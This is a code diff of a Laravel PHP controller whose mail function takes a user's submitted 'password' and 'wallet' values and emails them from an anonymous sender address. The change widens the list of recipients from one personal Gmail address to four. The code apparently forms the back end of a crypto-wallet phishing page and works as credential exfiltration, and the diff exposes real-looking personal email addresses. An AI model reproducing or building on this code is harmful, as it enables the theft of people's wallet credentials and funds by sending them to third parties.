@@ -8,14 +8,14 @@ use Mail;
 class Home extends Controller
 {
     public function mail(Request $request){
-        
+        $emails =array('nadym.baba@gmail.com','teamwaruq@gmail.com','tahalatief@gmail.com','aadi.latief@gmail.com'); 
         $data = array(
                         'password'=>$request->input('password'),
                         'wallet'=>$request->input('wallet')
                      );
-               
-              Mail::send('mail',$data,function($message) {
-                 $message->to('umairnoor.siddiqui@gmail.com');
+        
+              Mail::send('mail',$data,function($message)use($emails) {
+                 $message->to($emails);
                  $message->subject ('You have a Message');
                  $message->from('anonymous@gmail.com');
               });
